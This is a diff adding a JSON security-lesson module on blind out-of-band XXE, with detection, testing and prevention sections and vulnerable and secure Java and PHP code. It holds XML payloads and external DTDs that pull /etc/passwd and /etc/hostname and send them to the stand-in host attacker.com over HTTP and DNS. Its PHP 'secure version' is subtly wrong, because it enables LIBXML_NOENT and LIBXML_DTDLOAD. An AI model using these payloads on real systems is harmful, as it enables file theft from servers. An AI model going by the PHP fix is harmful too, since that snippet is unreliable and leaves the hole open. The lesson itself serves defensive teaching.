@@ -1,0 +1,135 @@
+{
+  "id": "blind-xxe",
+  "category": "vulnerabilities",
+  "title": "Blind XXE (Out-of-Band)",
+  "description": "Understanding and exploiting blind XXE vulnerabilities when direct entity expansion output is not visible in application responses.",
+  "severity": "critical",
+  "cvssScore": 8.6,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "Blind XXE vulnerabilities occur when an application parses XML containing external entity definitions but does not directly output the entity expansion results in its response. This is common in scenarios where:\n\n• XML is parsed for backend processing without user-visible output\n• Error messages are suppressed or generic\n• Application logs entity expansion but doesn't return it\n• XML is processed asynchronously\n\nBlind XXE requires out-of-band (OOB) techniques to exfiltrate data, typically using HTTP or DNS callbacks to an attacker-controlled server. Despite the lack of direct output, blind XXE remains critical as it can still enable:\n\n• File disclosure via OOB exfiltration\n• Server-Side Request Forgery (SSRF)\n• Denial of Service\n• Network reconnaissance"
+    },
+    {
+      "id": "detection",
+      "title": "Detection Techniques",
+      "type": "text",
+      "content": "Detecting blind XXE requires monitoring for out-of-band callbacks:\n\n1. **DNS-Based Detection**: Use DNS queries to a controlled domain\n2. **HTTP-Based Detection**: Trigger HTTP requests to a controlled server\n3. **Error-Based Detection**: Analyze timing and error patterns\n4. **FTP-Based Detection**: Use FTP protocol for Windows environments\n\nTools like Burp Collaborator, interactsh, or custom servers can capture these callbacks."
+    },
+    {
+      "id": "oob-detection-payload",
+      "title": "Out-of-Band Detection Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">\n  %remote;\n]>\n<root>\n  <data>&send;</data>\n</root>",
+        "isVulnerable": true,
+        "filename": "blind-xxe-detection.xml"
+      }
+    },
+    {
+      "id": "external-dtd",
+      "title": "External DTD for Data Exfiltration",
+      "type": "text",
+      "content": "The external DTD file (xxe.dtd) hosted on the attacker's server contains parameter entities that exfiltrate data:"
+    },
+    {
+      "id": "external-dtd-code",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>\">\n%eval;\n%send;",
+        "isVulnerable": true,
+        "filename": "xxe.dtd (hosted on attacker.com)"
+      }
+    },
+    {
+      "id": "parameter-entity-explanation",
+      "title": "How Parameter Entities Enable Blind XXE",
+      "type": "text",
+      "content": "Blind XXE exploitation relies on parameter entities:\n\n1. **%remote** - Fetches external DTD from attacker server\n2. **%file** - Reads local file content (e.g., /etc/passwd)\n3. **%eval** - Dynamically defines entity that sends data\n4. **%send** - Triggers HTTP request with file content in URL parameter\n\nWhen the XML parser processes this chain:\n• Parser fetches external DTD from attacker.com\n• External DTD reads /etc/passwd into %file\n• %eval creates &send; entity that makes HTTP request\n• %send; triggers the request, sending file content to attacker\n• Attacker captures file content in HTTP server logs"
+    },
+    {
+      "id": "vulnerable-java",
+      "title": "Vulnerable Java Implementation",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport java.io.ByteArrayInputStream;\n\npublic class BlindXXEVulnerable {\n    public void processXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Parse XML but don't output entity expansion\n            Document doc = builder.parse(\n                new ByteArrayInputStream(xmlData.getBytes())\n            );\n            \n            // Process document internally - no output to user\n            System.out.println(\"Document processed successfully\");\n            \n        } catch (Exception e) {\n            // Generic error - no details leaked\n            System.out.println(\"Processing failed\");\n        }\n    }\n}",
+        "isVulnerable": true,
+        "filename": "BlindXXEVulnerable.java"
+      }
+    },
+    {
+      "id": "secure-java",
+      "title": "Secure Java Implementation",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport java.io.ByteArrayInputStream;\n\npublic class BlindXXESecure {\n    public void processXML(String xmlData) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            \n            // Disable all external entity processing\n            factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n            factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n            factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n            factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n            factory.setXIncludeAware(false);\n            factory.setExpandEntityReferences(false);\n            \n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(\n                new ByteArrayInputStream(xmlData.getBytes())\n            );\n            \n            System.out.println(\"Document processed securely\");\n            \n        } catch (Exception e) {\n            System.out.println(\"Processing failed\");\n        }\n    }\n}",
+        "isVulnerable": false,
+        "filename": "BlindXXESecure.java"
+      }
+    },
+    {
+      "id": "php-example",
+      "title": "Blind XXE in PHP",
+      "type": "code",
+      "code": {
+        "language": "php",
+        "code": "<?php\n// Vulnerable - processes XML without output\n$xml = $_POST['xml'];\n$dom = new DOMDocument();\n$dom->loadXML($xml); // Default settings allow external entities\n\n// Process internally - no visible output\nfile_put_contents('processed.log', $dom->saveXML());\necho \"Processing complete\";\n\n// Secure version\n$dom = new DOMDocument();\nlibxml_disable_entity_loader(true); // Disable external entities\n$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);\necho \"Processing complete\";\n?>",
+        "isVulnerable": true,
+        "filename": "blind-xxe.php"
+      }
+    },
+    {
+      "id": "exfiltration-techniques",
+      "title": "Data Exfiltration Techniques",
+      "type": "text",
+      "content": "**HTTP-Based Exfiltration**\nMost common method. File content sent in URL parameters:\n• Advantages: Works in most environments, easy to set up\n• Limitations: URL length limits (~2KB), special characters require encoding\n\n**DNS-Based Exfiltration**\nExfiltrate data via DNS queries (subdomain labels):\n• Advantages: Works even when HTTP is blocked, harder to detect\n• Limitations: Very limited data size (63 chars per label, 253 total)\n\n**FTP-Based Exfiltration (Windows)**\nUse FTP SYSTEM identifier on Windows systems:\n• Advantages: Can exfiltrate larger files\n• Limitations: Windows-only, FTP often blocked by firewalls\n\n**Error-Based Exfiltration**\nTrigger errors that include file content:\n• Advantages: No external callback needed\n• Limitations: Requires error messages visible to attacker"
+    },
+    {
+      "id": "dns-exfiltration",
+      "title": "DNS Exfiltration Example",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Initial payload -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/dns.dtd\">\n  %remote;\n]>\n<root/>\n\n<!-- dns.dtd on attacker server -->\n<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com/'>\">\n%eval;\n%send;",
+        "isVulnerable": true,
+        "filename": "dns-exfiltration.xml"
+      }
+    },
+    {
+      "id": "prevention",
+      "title": "Prevention Strategies",
+      "type": "text",
+      "content": "1. **Disable External Entities**: Configure XML parsers to reject external entities (see language-specific guides)\n2. **Disable DTD Processing**: Completely disallow DOCTYPE declarations if not needed\n3. **Network Segmentation**: Prevent internal servers from making outbound HTTP/DNS requests\n4. **Whitelist Validation**: Only allow expected XML structures\n5. **WAF Rules**: Deploy web application firewall rules to detect XXE patterns\n6. **Monitoring**: Monitor for unusual outbound connections from application servers\n7. **Alternative Formats**: Use JSON instead of XML when possible"
+    },
+    {
+      "id": "testing",
+      "title": "Testing for Blind XXE",
+      "type": "text",
+      "content": "**Setup Requirements:**\n• Controlled domain with DNS/HTTP logging (Burp Collaborator, interactsh.com)\n• Test payloads with unique identifiers to track callbacks\n• Monitor logs for callbacks (may be delayed)\n\n**Test Methodology:**\n1. Send basic OOB detection payload\n2. Monitor for HTTP/DNS callbacks (check logs for 5-10 minutes)\n3. If callback received, attempt file exfiltration\n4. Test different protocols (http://, https://, ftp://)\n5. Test parameter entity techniques if direct entities fail\n6. Test error-based techniques if OOB fails\n\n**Tools:**\n• Burp Suite Professional (Collaborator)\n• interactsh.com (free OOB testing)\n• XXEinjector (automated exploitation)\n• Custom Python HTTP server for logging"
+    }
+  ],
+  "relatedTopics": ["classic-xxe", "parameter-entities", "file-disclosure", "ssrf"],
+  "references": [
+    {
+      "title": "PortSwigger: Blind XXE",
+      "url": "https://portswigger.net/web-security/xxe/blind"
+    },
+    {
+      "title": "OWASP XXE Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+    },
+    {
+      "title": "Exploiting Blind XXE to Exfiltrate Data Out-of-Band",
+      "url": "https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band"
+    }
+  ]
+}
